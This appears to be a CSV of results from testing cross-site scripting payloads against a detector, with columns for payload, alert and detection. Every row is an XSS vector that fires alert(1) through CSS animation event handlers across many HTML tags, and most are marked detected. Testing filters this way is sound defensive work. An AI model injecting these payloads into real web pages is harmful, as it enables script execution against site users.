Payload,Alert,Detected
"<style>@keyframes x{}</style><b style=""animation-name:x"" onanimationstart=""alert(1)""></b>",False,1
"<style>@keyframes x{}</style><b style=""animation-name:x"" onwebkitanimationend=""alert(1)""></b>",False,1
"<style>@keyframes x{}</style><b style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></b>",False,1
"<style>@keyframes x{}</style><bdi style=""animation-name:x"" onanimationend=""alert(1)""></bdi>",False,1
"<style>@keyframes x{}</style><bdi style=""animation-name:x"" onanimationstart=""alert(1)""></bdi>",False,1
"<style>@keyframes x{}</style><bdi style=""animation-name:x"" onwebkitanimationend=""alert(1)""></bdi>",False,1
"<style>@keyframes x{}</style><bdi style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></bdi>",False,1
"<style>@keyframes x{}</style><bdo style=""animation-name:x"" onanimationend=""alert(1)""></bdo>",False,1
"<style>@keyframes x{}</style><bdo style=""animation-name:x"" onanimationstart=""alert(1)""></bdo>",False,1
"<style>@keyframes x{}</style><bdo style=""animation-name:x"" onwebkitanimationend=""alert(1)""></bdo>",False,1
"<style>@keyframes x{}</style><bdo style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></bdo>",False,1
"<style>@keyframes x{}</style><big style=""animation-name:x"" onanimationend=""alert(1)""></big>",False,1
"<style>@keyframes x{}</style><big style=""animation-name:x"" onanimationstart=""alert(1)""></big>",False,1
"<style>@keyframes x{}</style><big style=""animation-name:x"" onwebkitanimationend=""alert(1)""></big>",False,1
"<style>@keyframes x{}</style><big style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></big>",False,1
"<style>@keyframes x{}</style><blink style=""animation-name:x"" onanimationend=""alert(1)""></blink>",False,1
"<style>@keyframes x{}</style><blink style=""animation-name:x"" onanimationstart=""alert(1)""></blink>",False,1
"<style>@keyframes x{}</style><blink style=""animation-name:x"" onwebkitanimationend=""alert(1)""></blink>",False,1
"<style>@keyframes x{}</style><blink style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></blink>",False,1
"<style>@keyframes x{}</style><blockquote style=""animation-name:x"" onanimationend=""alert(1)""></blockquote>",False,1
"<style>@keyframes x{}</style><blockquote style=""animation-name:x"" onanimationstart=""alert(1)""></blockquote>",False,1
"<style>@keyframes x{}</style><blockquote style=""animation-name:x"" onwebkitanimationend=""alert(1)""></blockquote>",False,1
"<style>@keyframes x{}</style><blockquote style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></blockquote>",False,1
"<style>@keyframes x{}</style><body style=""animation-name:x"" onanimationend=""alert(1)""></body>",False,1
"<style>@keyframes x{}</style><body style=""animation-name:x"" onanimationstart=""alert(1)""></body>",False,1
"<style>@keyframes x{}</style><body style=""animation-name:x"" onwebkitanimationend=""alert(1)""></body>",False,1
"<style>@keyframes x{}</style><body style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></body>",False,1
"<style>@keyframes x{}</style><br style=""animation-name:x"" onanimationend=""alert(1)""></br>",False,1
"<style>@keyframes x{}</style><br style=""animation-name:x"" onanimationstart=""alert(1)""></br>",False,1
"<style>@keyframes x{}</style><br style=""animation-name:x"" onwebkitanimationend=""alert(1)""></br>",False,1
"<style>@keyframes x{}</style><br style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></br>",False,1
"<style>@keyframes x{}</style><button style=""animation-name:x"" onanimationend=""alert(1)""></button>",False,1
"<style>@keyframes x{}</style><button style=""animation-name:x"" onanimationstart=""alert(1)""></button>",False,1
"<style>@keyframes x{}</style><button style=""animation-name:x"" onwebkitanimationend=""alert(1)""></button>",False,1
"<style>@keyframes x{}</style><button style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></button>",False,1
"<style>@keyframes x{}</style><canvas style=""animation-name:x"" onanimationend=""alert(1)""></canvas>",False,1
"<style>@keyframes x{}</style><canvas style=""animation-name:x"" onanimationstart=""alert(1)""></canvas>",False,1
"<style>@keyframes x{}</style><canvas style=""animation-name:x"" onwebkitanimationend=""alert(1)""></canvas>",False,1
"<style>@keyframes x{}</style><canvas style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></canvas>",False,1
"<style>@keyframes x{}</style><caption style=""animation-name:x"" onanimationend=""alert(1)""></caption>",False,1
"<style>@keyframes x{}</style><caption style=""animation-name:x"" onanimationstart=""alert(1)""></caption>",False,1
"<style>@keyframes x{}</style><caption style=""animation-name:x"" onwebkitanimationend=""alert(1)""></caption>",False,1
"<style>@keyframes x{}</style><caption style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></caption>",False,1
"<style>@keyframes x{}</style><center style=""animation-name:x"" onanimationend=""alert(1)""></center>",False,1
"<style>@keyframes x{}</style><center style=""animation-name:x"" onanimationstart=""alert(1)""></center>",False,1
"<style>@keyframes x{}</style><center style=""animation-name:x"" onwebkitanimationend=""alert(1)""></center>",False,1
"<style>@keyframes x{}</style><center style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></center>",False,1
"<style>@keyframes x{}</style><cite style=""animation-name:x"" onanimationend=""alert(1)""></cite>",False,1
"<style>@keyframes x{}</style><cite style=""animation-name:x"" onanimationstart=""alert(1)""></cite>",False,1
"<style>@keyframes x{}</style><cite style=""animation-name:x"" onwebkitanimationend=""alert(1)""></cite>",False,1
"<style>@keyframes x{}</style><cite style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></cite>",False,1
"<style>@keyframes x{}</style><code style=""animation-name:x"" onanimationend=""alert(1)""></code>",False,1
"<style>@keyframes x{}</style><code style=""animation-name:x"" onanimationstart=""alert(1)""></code>",False,1
"<style>@keyframes x{}</style><code style=""animation-name:x"" onwebkitanimationend=""alert(1)""></code>",False,1
"<style>@keyframes x{}</style><code style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></code>",False,1
"<style>@keyframes x{}</style><col style=""animation-name:x"" onanimationend=""alert(1)""></col>",False,1
"<style>@keyframes x{}</style><col style=""animation-name:x"" onanimationstart=""alert(1)""></col>",False,1
"<style>@keyframes x{}</style><col style=""animation-name:x"" onwebkitanimationend=""alert(1)""></col>",False,1
"<style>@keyframes x{}</style><col style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></col>",False,1
"<style>@keyframes x{}</style><colgroup style=""animation-name:x"" onanimationend=""alert(1)""></colgroup>",False,1
"<style>@keyframes x{}</style><colgroup style=""animation-name:x"" onanimationstart=""alert(1)""></colgroup>",False,1
"<style>@keyframes x{}</style><colgroup style=""animation-name:x"" onwebkitanimationend=""alert(1)""></colgroup>",False,1
"<style>@keyframes x{}</style><colgroup style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></colgroup>",False,1
"<style>@keyframes x{}</style><command style=""animation-name:x"" onanimationend=""alert(1)""></command>",False,1
"<style>@keyframes x{}</style><command style=""animation-name:x"" onanimationstart=""alert(1)""></command>",False,1
"<style>@keyframes x{}</style><command style=""animation-name:x"" onwebkitanimationend=""alert(1)""></command>",False,1
"<style>@keyframes x{}</style><command style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></command>",False,1
"<style>@keyframes x{}</style><content style=""animation-name:x"" onanimationend=""alert(1)""></content>",False,1
"<style>@keyframes x{}</style><content style=""animation-name:x"" onanimationstart=""alert(1)""></content>",False,1
"<style>@keyframes x{}</style><content style=""animation-name:x"" onwebkitanimationend=""alert(1)""></content>",False,1
"<style>@keyframes x{}</style><content style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></content>",False,1
"<style>@keyframes x{}</style><custom tags style=""animation-name:x"" onanimationend=""alert(1)""></custom tags>",False,1
"<style>@keyframes x{}</style><custom tags style=""animation-name:x"" onanimationstart=""alert(1)""></custom tags>",False,1
"<style>@keyframes x{}</style><custom tags style=""animation-name:x"" onwebkitanimationend=""alert(1)""></custom tags>",False,1
"<style>@keyframes x{}</style><custom tags style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></custom tags>",False,1
"<style>@keyframes x{}</style><data style=""animation-name:x"" onanimationend=""alert(1)""></data>",False,1
"<style>@keyframes x{}</style><data style=""animation-name:x"" onanimationstart=""alert(1)""></data>",False,1
"<style>@keyframes x{}</style><data style=""animation-name:x"" onwebkitanimationend=""alert(1)""></data>",False,1
"<style>@keyframes x{}</style><data style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></data>",False,0
"<style>@keyframes x{}</style><datalist style=""animation-name:x"" onanimationend=""alert(1)""></datalist>",False,1
"<style>@keyframes x{}</style><datalist style=""animation-name:x"" onanimationstart=""alert(1)""></datalist>",False,1
"<style>@keyframes x{}</style><datalist style=""animation-name:x"" onwebkitanimationend=""alert(1)""></datalist>",False,1
"<style>@keyframes x{}</style><datalist style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></datalist>",False,1
"<style>@keyframes x{}</style><dd style=""animation-name:x"" onanimationend=""alert(1)""></dd>",False,1
"<style>@keyframes x{}</style><dd style=""animation-name:x"" onanimationstart=""alert(1)""></dd>",False,1
"<style>@keyframes x{}</style><dd style=""animation-name:x"" onwebkitanimationend=""alert(1)""></dd>",False,1
"<style>@keyframes x{}</style><dd style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></dd>",False,1
"<style>@keyframes x{}</style><del style=""animation-name:x"" onanimationend=""alert(1)""></del>",False,1
"<style>@keyframes x{}</style><del style=""animation-name:x"" onanimationstart=""alert(1)""></del>",False,1
"<style>@keyframes x{}</style><del style=""animation-name:x"" onwebkitanimationend=""alert(1)""></del>",False,1
"<style>@keyframes x{}</style><del style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></del>",False,1
"<style>@keyframes x{}</style><details style=""animation-name:x"" onanimationend=""alert(1)""></details>",False,1
"<style>@keyframes x{}</style><details style=""animation-name:x"" onanimationstart=""alert(1)""></details>",False,1
"<style>@keyframes x{}</style><details style=""animation-name:x"" onwebkitanimationend=""alert(1)""></details>",False,1
"<style>@keyframes x{}</style><details style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></details>",False,1
"<style>@keyframes x{}</style><dfn style=""animation-name:x"" onanimationend=""alert(1)""></dfn>",False,1
"<style>@keyframes x{}</style><dfn style=""animation-name:x"" onanimationstart=""alert(1)""></dfn>",False,1
"<style>@keyframes x{}</style><dfn style=""animation-name:x"" onwebkitanimationend=""alert(1)""></dfn>",False,1
"<style>@keyframes x{}</style><dfn style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></dfn>",False,1
"<style>@keyframes x{}</style><dialog style=""animation-name:x"" onanimationend=""alert(1)""></dialog>",False,1
"<style>@keyframes x{}</style><dialog style=""animation-name:x"" onanimationstart=""alert(1)""></dialog>",False,1
"<style>@keyframes x{}</style><dialog style=""animation-name:x"" onwebkitanimationend=""alert(1)""></dialog>",False,1
"<style>@keyframes x{}</style><dialog style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></dialog>",False,1
"<style>@keyframes x{}</style><dir style=""animation-name:x"" onanimationend=""alert(1)""></dir>",False,1
"<style>@keyframes x{}</style><dir style=""animation-name:x"" onanimationstart=""alert(1)""></dir>",False,1
"<style>@keyframes x{}</style><dir style=""animation-name:x"" onwebkitanimationend=""alert(1)""></dir>",False,1
"<style>@keyframes x{}</style><dir style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></dir>",False,1
"<style>@keyframes x{}</style><div style=""animation-name:x"" onanimationend=""alert(1)""></div>",False,1
"<style>@keyframes x{}</style><div style=""animation-name:x"" onanimationstart=""alert(1)""></div>",False,1
"<style>@keyframes x{}</style><div style=""animation-name:x"" onwebkitanimationend=""alert(1)""></div>",False,1
"<style>@keyframes x{}</style><div style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></div>",False,1
"<style>@keyframes x{}</style><dl style=""animation-name:x"" onanimationend=""alert(1)""></dl>",False,1
"<style>@keyframes x{}</style><dl style=""animation-name:x"" onanimationstart=""alert(1)""></dl>",False,1
"<style>@keyframes x{}</style><dl style=""animation-name:x"" onwebkitanimationend=""alert(1)""></dl>",False,1
"<style>@keyframes x{}</style><dl style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></dl>",False,1
"<style>@keyframes x{}</style><dt style=""animation-name:x"" onanimationend=""alert(1)""></dt>",False,1
"<style>@keyframes x{}</style><dt style=""animation-name:x"" onanimationstart=""alert(1)""></dt>",False,1
"<style>@keyframes x{}</style><dt style=""animation-name:x"" onwebkitanimationend=""alert(1)""></dt>",False,1
"<style>@keyframes x{}</style><dt style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></dt>",False,1
"<style>@keyframes x{}</style><element style=""animation-name:x"" onanimationend=""alert(1)""></element>",False,1
"<style>@keyframes x{}</style><element style=""animation-name:x"" onanimationstart=""alert(1)""></element>",False,1
"<style>@keyframes x{}</style><element style=""animation-name:x"" onwebkitanimationend=""alert(1)""></element>",False,1
"<style>@keyframes x{}</style><element style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></element>",False,1
"<style>@keyframes x{}</style><em style=""animation-name:x"" onanimationend=""alert(1)""></em>",False,1
"<style>@keyframes x{}</style><em style=""animation-name:x"" onanimationstart=""alert(1)""></em>",False,1
"<style>@keyframes x{}</style><em style=""animation-name:x"" onwebkitanimationend=""alert(1)""></em>",False,1
"<style>@keyframes x{}</style><em style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></em>",False,1
"<style>@keyframes x{}</style><embed style=""animation-name:x"" onanimationend=""alert(1)""></embed>",False,1
"<style>@keyframes x{}</style><embed style=""animation-name:x"" onanimationstart=""alert(1)""></embed>",False,1
"<style>@keyframes x{}</style><embed style=""animation-name:x"" onwebkitanimationend=""alert(1)""></embed>",False,1
"<style>@keyframes x{}</style><embed style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></embed>",False,1
"<style>@keyframes x{}</style><fieldset style=""animation-name:x"" onanimationend=""alert(1)""></fieldset>",False,1
"<style>@keyframes x{}</style><fieldset style=""animation-name:x"" onanimationstart=""alert(1)""></fieldset>",False,1
"<style>@keyframes x{}</style><fieldset style=""animation-name:x"" onwebkitanimationend=""alert(1)""></fieldset>",False,1
"<style>@keyframes x{}</style><fieldset style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></fieldset>",False,1
